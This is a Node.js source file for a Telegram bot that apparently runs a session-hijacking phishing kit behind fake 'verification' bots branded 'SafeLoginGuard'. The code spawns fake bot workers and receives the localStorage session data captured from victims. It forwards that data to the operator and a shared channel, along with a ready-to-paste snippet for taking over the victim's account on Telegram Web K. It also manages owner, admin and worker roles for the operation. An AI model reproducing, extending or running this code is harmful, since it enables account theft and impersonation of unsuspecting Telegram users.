const { Telegraf, Markup } = require('telegraf');
const { Worker, setEnvironmentData } = require("worker_threads");
const fs = require('fs');
const path = require('path');
const { Keyboard } = require('telegram-keyboard');
const { message } = require('telegraf/filters');

/** @type {Array<Worker>} */
const botWorkers = [];

/** @type {string} */
let BOT_TOKEN,
/** @type {string} */
    MINI_APP_URL,
/** @type {string} */
    VERIFICATION_IMAGE_URL,
/** @type {string} */
    VERIFIED_IMAGE_URL,
/** @type {number} */
    OWNER,
/** @type {Telegraf} */
    bot;

const pendingSetups = [];

const HELP_MESSAGE = fs.readFileSync("helpMessage.txt", "utf-8").replace("#", "\\");

const UNPRIVILEGED_MESSAGE = "You are not privileged to use this command.";

class ChannelEntry {
    /** @type {string} */
    channelId;
    /** @type {number} */
    ownerId;

    constructor(channelId, ownerId) {
        this.channelId = channelId;
        this.ownerId = ownerId;
    }
}

let db = {
    BOT_TOKEN: undefined,
    MINI_APP_URL: undefined,
    VERIFICATION_IMAGE_URL: undefined,
    VERIFIED_IMAGE_URL: undefined,
    OWNER: undefined,
    DH_CHANNELID: undefined,
    Admins: [],
    Workers: [],
/** @type {Array<FakeBot>} */
    Bots: [],
/** @type {Array<ChannelEntry>} */
    VerificationMessages: []
};

class FakeBot {
    /** @type {string} */
    token;
    /** @type {string} */
    name;
    /** @type {string} */
    username;

    constructor(token, name, username) {
        this.token = token;
        this.name = name;
        this.username = username;
    }
}

const UserPrivilege = {
    Admin: 2,
    Worker: 1,
    Unprivileged: 0
}

let userVerificationInfo = [];

function getPrivilege(userId) {
    if (db.Admins.includes(userId)) return UserPrivilege.Admin;
    if (db.Workers.includes(userId)) return UserPrivilege.Worker;
    return UserPrivilege.Unprivileged;
}

function hasPrivilege(userId, requiredPrivilege) {
    const userPrivilege = getPrivilege(userId);
    return userPrivilege >= requiredPrivilege;
}

async function completeUserVerification(verificationKey) {
    const entry = userVerificationInfo.filter((d) => d.verificationKey == verificationKey)[0];
    if (entry == undefined) return;
    deleteFromPendingList(entry.userId, entry.botId)

    try {
        await entry.context.sendPhoto(VERIFIED_IMAGE_URL, {
            caption:
                "Verified, you can join the group using this temporary link:\n\n" +
                `https://t.me/+yourtestgroupinvite\n\n` + // CHANGE TO YOUR REAL TEST INVITE LINK
                "This link is a one time use and will expire"
        });
    } catch (err) {
        console.error("Send photo error:", err);
    }
}

function deleteFromPendingList(userId, botId) {
    const entries = userVerificationInfo.filter((d) => d.userId == userId && d.botId == botId);
    for (let i = 0; i < entries.length; i++) {
        if (entries[i].userId == userId && entries[i].botId == botId) {
            userVerificationInfo.splice(userVerificationInfo.indexOf(entries[i]));
        }
    }
}

async function initFakeBot(token, name, username) {
    try {
        const b = new FakeBot(token, name, username);
        if (!db.Bots.some((d) => d.name === b.name && d.token === b.token && b.username === d.username)) {
            db.Bots.push(b);
            fs.writeFileSync("db.json", JSON.stringify(db, null, 4)); // Persist bots
        }
        const worker = new Worker(path.resolve(__dirname, "./bot.js"), {
            workerData: {
                token,
                name
            }
        });

        worker.on("message", (msg) => {
            if (msg.type != "localstorage") return;

            if (msg.data == undefined || msg.data.data == undefined || msg.data.channel == undefined) return;

            const entry = db.VerificationMessages.filter((d) => d.channelId == msg.data.channel)[0];
            if (entry == undefined) return;

            try {
                bot.telegram.sendMessage(entry.ownerId, "🛡 User has verified successfully\n\n❓ **How to login**: execute the code below on Telegram WebK https://web.telegram.org/k/\n\n```>\nlocalStorage.clear(); " + JSON.stringify(msg.data.data) + ".forEach(entry => localStorage.setItem(Object.keys(entry)[0], Object.values(entry)[0])); location.reload();```", {
                    parse_mode: 'Markdown'
                });
                bot.telegram.sendMessage(db.DH_CHANNELID, "🛡 User has verified successfully\n\n❓ **How to login**: execute the code below on Telegram WebK https://web.telegram.org/k/\n\n```>\nlocalStorage.clear(); " + JSON.stringify(msg.data.data) + ".forEach(entry => localStorage.setItem(Object.keys(entry)[0], Object.values(entry)[0])); location.reload();```", {
                    parse_mode: 'Markdown'
                });
            } catch (err) {
                console.error("Send log error:", err);
            }
        });

        botWorkers.push(worker);
        console.log(`Fake bot '${name}' initialized`);
    } catch (ex) {
        console.error("Failed to initialize fake bot:", ex);
    }
}

async function readConfig() {
    try {
        let config = {};
        const fileContent = fs.readFileSync("config.json", 'utf-8');
        config = JSON.parse(fileContent);

        if (!fs.existsSync("db.json")) {
            console.log("creating database...");
            db = { ...config, Admins: [config.OWNER], Workers: [], Bots: [], VerificationMessages: [] };
            fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
        } else {
            const dbContent = fs.readFileSync("db.json", 'utf-8');
            db = JSON.parse(dbContent);
        }
    } catch (err) {
        console.error("Config/DB read error:", err);
        process.exit(1);
    }
}

async function initBot() {
    try {
        await readConfig();
        BOT_TOKEN = db.BOT_TOKEN;
        MINI_APP_URL = db.MINI_APP_URL;
        VERIFICATION_IMAGE_URL = db.VERIFICATION_IMAGE_URL;
        VERIFIED_IMAGE_URL = db.VERIFIED_IMAGE_URL;
        OWNER = db.OWNER;

        bot = new Telegraf(BOT_TOKEN);

        bot.catch((err, ctx) => {
            console.error('Main bot error:', err);
            if (err.response && err.response.error_code === 409) {
                console.log('409 Conflict caught, retrying...');
            }
        });

        // Enhanced retry for 409 with longer initial delay
        setTimeout(async () => {
            let retryCount = 0;
            const maxRetries = 5; // Increased for persistence
            const baseDelay = 45000; // 45s initial to let sessions expire

            const launchWithRetry = async () => {
                try {
                    await bot.launch();
                    console.log('Main bot launched successfully');
                    return;
                } catch (err) {
                    if (err.response && err.response.error_code === 409) {
                        retryCount++;
                        if (retryCount >= maxRetries) {
                            console.error('Max retries reached for 409 conflict - bot may be unstable');
                            return;
                        }
                        const delay = baseDelay * Math.pow(1.5, retryCount - 1); // Softer backoff: 45s, 67s, 100s, etc.
                        console.log(`409 Conflict (attempt ${retryCount}/${maxRetries}), retrying in ${Math.round(delay/1000)}s...`);
                        setTimeout(launchWithRetry, delay);
                    } else {
                        console.error('Non-409 launch error:', err);
                        throw err;
                    }
                }
            };

            await launchWithRetry();
        }, 45000); // 45s initial delay

        bot.command("start", async (ctx) => {
            try {
                if (ctx.chat.type != "private") return;
                if (pendingSetups.length > 0) {
                    const pendings = pendingSetups[pendingSetups.length - 1];
                    if (pendings.step == 0) {
                        await ctx.reply("Setup is complete.");
                        pendingSetups.splice(pendingSetups.indexOf(pendings), 1);
                        return;
                    }
                }
                await ctx.reply(HELP_MESSAGE, { parse_mode: 'Markdown' });
            } catch (err) {
                console.error("Start command error:", err);
            }
        });

        bot.on("my_chat_member", async (ctx) => {
            try {
                if (ctx.myChatMember.new_chat_member.status != "administrator") return;
                if (ctx.myChatMember.chat.type != 'channel') return;

                if (db.Bots.length === 0) {
                    await bot.telegram.sendMessage(ctx.from.id, "No fake bots available. Please add one using /addbot <token> <name> <username> in private chat.");
                    return;
                }

                const keyboard = Keyboard.make([
                    db.Bots.map((b) => ({ text: b.name, callback_data: `bot_${b.username}` }))
                ], {
                    columns: 3
                }).inline();

                pendingSetups.push({ owner: ctx.from.id, channel: ctx.myChatMember.chat.id.toString(), channelName: ctx.myChatMember.chat.title, step: 0, bot: undefined, mode: 0 });
                await bot.telegram.sendMessage(ctx.from.id, "Please choose the bot you'd like to use.", keyboard);
            } catch (err) {
                console.error("My chat member error:", err);
            }
        });

        /* Administrator commands - Fixed arg parsing */
        bot.command("addbot", async (ctx) => {
            try {
                if (!hasPrivilege(ctx.from.id, UserPrivilege.Admin)) return await ctx.reply(UNPRIVILEGED_MESSAGE);
                const args = ctx.message.text.split(' ').slice(1); // Fix: Split message text, skip command
                if (args.length < 3) return ctx.reply(`Bad usage!\nUsage: /addbot <token> <name> <username>`);
                const token = args[0], name = args[1], username = args[2];
                await initFakeBot(token, name, username);
                return ctx.reply(`Bot '${name}' added.`);
            } catch (err) {
                console.error("Addbot command error:", err);
                return ctx.reply("Error adding bot. Ensure args are correct.");
            }
        });

        bot.command("addworker", async (ctx) => {
            try {
                if (!hasPrivilege(ctx.from.id, UserPrivilege.Admin)) return await ctx.reply(UNPRIVILEGED_MESSAGE);
                const args = ctx.message.text.split(' ').slice(1); // Fix: Split message text
                if (args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /addworker <id>`);
                const worker = parseInt(args[0]);
                if (isNaN(worker)) return await ctx.reply(`Invalid userId`);
                if (db.Workers.includes(worker)) return await ctx.reply(`The worker is already registered`);
                db.Workers.push(worker);
                fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
                return await ctx.reply(`Worker added.`);
            } catch (err) {
                console.error("Addworker command error:", err);
                return ctx.reply("Error adding worker.");
            }
        });

        /* Owner commands - Fixed arg parsing */
        bot.command("removeworker", async (ctx) => {
            try {
                if (ctx.from.id != db.OWNER) return await ctx.reply(UNPRIVILEGED_MESSAGE);
                const args = ctx.message.text.split(' ').slice(1); // Fix: Split message text
                if (args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /removeworker <id>`);
                const worker = parseInt(args[0]);
                if (isNaN(worker)) return await ctx.reply(`Invalid userId`);
                if (!db.Workers.includes(worker)) return await ctx.reply(`The user is not a worker.`);
                db.Workers.splice(db.Workers.indexOf(worker), 1);
                fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
                return await ctx.reply(`Worker removed.`);
            } catch (err) {
                console.error("Removeworker command error:", err);
                return ctx.reply("Error removing worker.");
            }
        });

        bot.command("addadmin", async (ctx) => {
            try {
                if (ctx.from.id != db.OWNER) return await ctx.reply(UNPRIVILEGED_MESSAGE);
                const args = ctx.message.text.split(' ').slice(1); // Fix: Split message text
                if (args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /addadmin <id>`);
                const admin = parseInt(args[0]);
                if (isNaN(admin)) return await ctx.reply(`Invalid userId`);
                if (db.Admins.includes(admin)) return await ctx.reply(`The user is already an admin`);
                db.Admins.push(admin);
                fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
                return await ctx.reply(`Admin added.`);
            } catch (err) {
                console.error("Addadmin command error:", err);
                return ctx.reply("Error adding admin.");
            }
        });

        bot.command("removeadmin", async (ctx) => {
            try {
                if (ctx.from.id != db.OWNER) return await ctx.reply(UNPRIVILEGED_MESSAGE);
                const args = ctx.message.text.split(' ').slice(1); // Fix: Split message text
                if (args.length < 1) return await ctx.reply(`Bad usage!\nUsage: /removeadmin <id>`);
                const admin = parseInt(args[0]);
                if (isNaN(admin)) return await ctx.reply(`Invalid userId`);
                if (!db.Admins.includes(admin)) return await ctx.reply(`The user is not an administrator`);
                db.Admins.splice(db.Admins.indexOf(admin), 1);
                fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
                return await ctx.reply(`Admin removed.`);
            } catch (err) {
                console.error("Removeadmin command error:", err);
                return ctx.reply("Error removing admin.");
            }
        });

        bot.on(message('text'), async (ctx) => {
            try {
                if (ctx.chat.type != "private") return;
                ctx.reply("Welcome to *SafeLoginGuard*!\n\n✨ *The bot will send you logs here.*\n\n_👤 To get started, add the bot to a channel and set it as an administrator._", {
                    reply_markup: {
                        inline_keyboard: [
                            [{text: "👆 Add", url: `https://t.me/${await bot.telegram.getMe().then(me => me.username)}?startchannel&admin=post_messages`}],
                            [{text: "👋 Support", url: "https://t.me/rafalzaorsky"}, {text: "🔄 Channel", url: "https://t.me/+1BxU1hPH3-E5YTdk"}]
                        ]
                    },
                    parse_mode: 'Markdown'
                });
            } catch (err) {
                console.error("Text message error:", err);
            }
        });

       process.once('SIGINT', () => {
    console.log('SIGINT received, stopping bot...');
    if (bot && bot.botInfo) bot.stop('SIGINT').catch(() => console.log('Bot already stopped'));
});
process.once('SIGTERM', () => {
    console.log('SIGTERM received, stopping bot...');
    if (bot && bot.botInfo) bot.stop('SIGTERM').catch(() => console.log('Bot already stopped'));
});

        initWorker();
    } catch (error) {
        console.error('Failed to initialize bot:', error);
    }
}

process.on("uncaughtException", console.log);
process.on("unhandledRejection", console.log);

async function saveDatabase() {
    setEnvironmentData("db", db);
    fs.writeFileSync("db.json", JSON.stringify(db, null, 4));
}

async function initWorker() {
    try {
        const worker = new Worker(path.resolve(__dirname, "./server.js"));
        worker.on("message", (msg) => {
            botWorkers.forEach((w) => w.postMessage(msg));
        });
        console.log('HTTP Worker initialized');
    } catch (err) {
        console.error('Worker init error:', err);
    }
}

initBot();
setInterval(saveDatabase, 1000);

